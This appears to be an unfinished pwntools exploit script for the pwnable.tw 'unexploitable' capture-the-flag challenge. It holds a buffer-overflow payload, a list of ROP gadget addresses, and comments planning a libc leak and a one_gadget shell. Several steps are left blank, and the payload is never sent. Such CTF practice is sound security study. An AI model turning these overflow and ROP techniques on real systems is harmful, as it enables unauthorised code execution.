from pwn import *


r = process("./unexploitable")
# r = remote("chall.pwnable.tw", 10403)
libc = ELF('libc_64.so.6')

payload = b'a'*0x10 + p64(0x60100f) + p64(0x40064c)

# [GOAL]
#   1. leak libc
#       * read(0, 0x601000, )
#       * write(1, 0x601000, 0x8)
#   2. one_gadget
#       * 


# 0x0000000000400293 : add edi, ebx ; retf
# 0x0000000000400511 : pop rbx ; pop rbp ; ret
# 0x0000000000400600 : mov edi, dword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
# 0x0000000000400510 : or byte ptr [rbx + 0x5d], bl ; ret
# rbx = 0x600fb3 
# [0x601010]|0xb3 

# libc_read = 
# libc_write = libc_read + 0xa0
input("@")
# r.sendline(payload)
r.send(b'\x00')
r.interactive()